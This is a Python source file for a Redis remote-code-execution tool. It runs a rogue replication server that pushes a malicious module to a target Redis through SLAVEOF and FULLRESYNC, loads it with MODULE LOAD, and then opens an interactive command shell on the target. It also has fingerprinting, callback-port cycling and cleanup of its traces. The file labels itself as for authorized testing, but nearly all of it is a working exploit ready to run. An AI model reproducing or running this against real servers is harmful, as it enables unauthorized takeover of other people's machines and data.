#!/usr/bin/env python3
# coding:utf-8
import socket
import os
import sys
from time import sleep
import argparse
from six.moves import input

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

CLRF = "\r\n"
LOGO = R"""
█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   

"""

def mk_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd


def mk_cmd(raw_cmd):
    return mk_cmd_arr(raw_cmd.split(" "))


def din(sock, cnt):
    msg = sock.recv(cnt)
    if verbose:
        if len(msg) < 300:
            print("\033[1;34;40m[->]\033[0m {}".format(msg))
        else:
            print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
    try:
        result = msg.decode()
    except:
        result = msg
    return result


def dout(sock, msg):
    if type(msg) != bytes:
        msg = msg.encode()
    sock.sendall(msg)
    if verbose:
        if sys.version_info < (3, 0):
            msg = repr(msg)
        if len(msg) < 300:
            print("\033[1;32;40m[<-]\033[0m {}".format(msg))
        else:
            print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))


def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])


def decode_bulk_array(s):
    return [part for part in s.split("\r\n") if part and not part.startswith(("*", "$"))]


def discover_lhost(rhost, rport):
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((rhost, rport))
        return probe.getsockname()[0]
    finally:
        probe.close()


class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.settimeout(socket_timeout)
        self._sock.connect((self._host, self._port))

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(mk_cmd(cmd))
        buf = self.recv()
        return buf

    def close(self):
        self._sock.close()

    def shell_cmd(self, cmd):
        self.send(mk_cmd_arr(['system.exec', "{}".format(cmd)]))
        buf = self.recv()
        return buf


class RogueServer:
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(callback_timeout)
        self._sock.bind((self._host, self._port))
        self._sock.listen(10)

    def handle(self, data):
        resp = ""
        phase = 0
        if data.find("PING") > -1:
            resp = "+PONG" + CLRF
            phase = 1
        elif data.find("REPLCONF") > -1:
            resp = "+OK" + CLRF
            phase = 2
        elif data.find("PSYNC") > -1 or data.find("SYNC") > -1:
            resp = "+FULLRESYNC " + "Z" * 40 + " 0" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 3
        return resp, phase

    def close(self):
        self._sock.close()

    def exp(self):
        cli = None
        try:
            cli, addr = self._sock.accept()
            print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(addr[0], addr[1]))
            cli.settimeout(10)
            while True:
                data = din(cli, 1024)
                if len(data) == 0:
                    break
                resp, phase = self.handle(data)
                dout(cli, resp)
                if phase == 3:
                    break
        except Exception as e:
            print("\033[1;31;m[-]\033[0m Rogue server error: {}".format(e))
            return False
        finally:
            if cli:
                cli.close()
        return True

def interact(remote):
    print("\033[92m[+]\033[0m Received backconnect, use exit to exit...")
    try:
        while True:
            cmd = input("$ ")
            cmd = cmd.strip()
            if cmd == "exit":
                return
            r = remote.shell_cmd(cmd)
            for l in decode_shell_result(r).split("\n"):
                if l:
                    print(l)
    except KeyboardInterrupt:
        return


def runserver(rhost, rport, lhost, lports):
    expfile = ".redis-rce-{}-{}.so".format(os.getpid(), int(__import__('time').time()))
    remote = Remote(rhost, rport)
    if auth:
        check = remote.do("AUTH {}".format(auth))
        if "invalid password" in check:
            print("\033[1;31;m[-]\033[0m Wrong password !")
            return
    else:
        info = remote.do("INFO")
        if "NOAUTH" in info:
            print("\033[1;31;m[-]\033[0m Need password.")
            return
    server_info = remote.do("INFO server")
    version = next((line.split(":", 1)[1] for line in server_info.splitlines()
                    if line.startswith("redis_version:")), "unknown")
    os_info = next((line.split(":", 1)[1] for line in server_info.splitlines()
                    if line.startswith("os:")), "unknown")
    print("[+] Target Redis {} on {}".format(version, os_info))
    original_dir_parts = decode_bulk_array(remote.do("CONFIG GET dir"))
    original_file_parts = decode_bulk_array(remote.do("CONFIG GET dbfilename"))
    original_dir = original_dir_parts[-1] if original_dir_parts else None
    original_file = original_file_parts[-1] if original_file_parts else "dump.rdb"
    if check_only:
        print("[+] Check complete; no exploit actions performed.")
        remote.close()
        return

    defaults = ["/dev/shm", "/tmp", "/var/tmp", original_dir]
    candidate_dirs = [target_dir] if target_dir != "auto" else list(dict.fromkeys(d for d in defaults if d))
    module_path = None
    load_result = None
    uploaded_paths = []
    for lport in lports:
        try:
            rogue = RogueServer(lhost, lport)
        except OSError as e:
            print("[-] Cannot listen on {}:{}: {}".format(lhost, lport, e))
            continue
        print("[*] Testing callback {}:{}".format(lhost, lport))
        callback_failed = False
        try:
            for candidate_dir in candidate_dirs:
                print("[*] Trying target directory {}".format(candidate_dir))
                dir_result = remote.do("CONFIG SET dir {}".format(candidate_dir))
                if dir_result.startswith("-ERR"):
                    print("[-] Directory rejected: {}".format(dir_result.strip()))
                    continue
                filename_result = remote.do("CONFIG SET dbfilename {}".format(expfile))
                if filename_result.startswith("-ERR"):
                    print("[-] Filename rejected: {}".format(filename_result.strip()))
                    continue
                remote.do("SLAVEOF NO ONE")
                slave_result = remote.do("SLAVEOF {} {}".format(lhost, lport))
                if slave_result.startswith("-ERR"):
                    print("[-] SLAVEOF failed: {}".format(slave_result.strip()))
                    continue
                print("[*] Transferring payload")
                if not rogue.exp():
                    remote.do("SLAVEOF NO ONE")
                    callback_failed = True
                    break
                sleep(1)
                module_path = "{}/{}".format(candidate_dir.rstrip("/"), expfile)
                uploaded_paths.append(module_path)
                load_result = remote.do("MODULE LOAD {}".format(module_path))
                remote.do("SLAVEOF NO ONE")
                if load_result == "+OK\r\n":
                    print("[+] Module loaded from {} via port {}".format(module_path, lport))
                    break
                print("[-] MODULE LOAD failed in {}: {}".format(candidate_dir, load_result.strip()))
        finally:
            rogue.close()
        if load_result == "+OK\r\n":
            break
        if callback_failed:
            print("[-] No callback on port {}; trying the next port".format(lport))

    if load_result != "+OK\r\n":
        print("\033[1;31;m[-]\033[0m Could not load the module from any candidate directory.")
        remote.do("SLAVEOF NO ONE")
        remote.do("CONFIG SET dbfilename {}".format(original_file))
        if original_dir:
            remote.do("CONFIG SET dir {}".format(original_dir))
        remote.close()
        return

    if one_command:
        result = remote.shell_cmd(one_command)
        print(decode_shell_result(result))
    else:
        interact(remote)

    if not no_cleanup:
        print("[*] Cleaning up and restoring Redis configuration..")
        for path in list(dict.fromkeys(uploaded_paths)):
            remote.shell_cmd("rm -f {}".format(path))
        remote.do("MODULE UNLOAD system")
        remote.do("CONFIG SET dbfilename {}".format(original_file))
        if original_dir:
            remote.do("CONFIG SET dir {}".format(original_dir))
    remote.close()


def main():
    parser = argparse.ArgumentParser(description='Redis rogue-replication module loader for authorized testing')
    parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
    parser.add_argument("-p", "--rport", dest="rport", type=int,
                        help="target redis port, default 6379", default=6379)
    parser.add_argument("-L", "--lhost", dest="lhost", type=str,
                        help="callback IP (default: auto-detect from route)")
    parser.add_argument("-P", "--lports", dest="lports", type=str, default="auto",
                        help="callback port(s), comma-separated, or auto (default: auto)")
    parser.add_argument("-f", "--file", type=str, help="Redis module payload",
                        default=os.path.join(SCRIPT_DIR, 'exp_lin.so'))
    parser.add_argument("-d", "--dir", dest="target_dir", type=str,
                        help="target directory, or auto to try executable candidates (default: auto)",
                        default='auto')
    parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password")
    parser.add_argument("-c", "--command", dest="command", help="run one command instead of interactive mode")
    parser.add_argument("--check", action="store_true", help="fingerprint only; do not exploit")
    parser.add_argument("--no-cleanup", action="store_true", help="leave module and configuration in place")
    parser.add_argument("--timeout", type=float, default=5.0, help="Redis socket timeout")
    parser.add_argument("--callback-timeout", type=float, default=6.0, help="timeout per callback port")
    parser.add_argument("-v", "--verbose", action="store_true", help="show more info", default=False)
    options = parser.parse_args()
    # runserver("127.0.0.1", 6379, "127.0.0.1", 21000)

    print("[*] Connecting to  {}:{}...".format(options.rhost, options.rport))
    global payload, verbose, filename, auth, target_dir, socket_timeout, callback_timeout
    global one_command, check_only, no_cleanup
    auth = options.auth
    filename = options.file
    target_dir = options.target_dir
    socket_timeout = options.timeout
    callback_timeout = options.callback_timeout
    one_command = options.command
    check_only = options.check
    no_cleanup = options.no_cleanup
    verbose = options.verbose
    if not check_only and os.path.exists(filename) == False:
        print("\033[1;31;m[-]\033[0m Where you module? ")
        exit(0)
    payload = open(filename, "rb").read() if not check_only else b""
    lhost = options.lhost or discover_lhost(options.rhost, options.rport)
    if not options.lhost:
        print("[+] Auto-detected callback IP {}".format(lhost))
    if options.lports == "auto":
        lports = list(dict.fromkeys([options.rport, 6380, 4444, 21000]))
    else:
        lports = [int(port.strip()) for port in options.lports.split(",") if port.strip()]
    try:
        runserver(options.rhost, options.rport, lhost, lports)
    except Exception as e:
        print("\033[1;31;m[-]\033[0m Error :{}, exit..".format(e))


if __name__ == '__main__':
    print(LOGO)
    main()
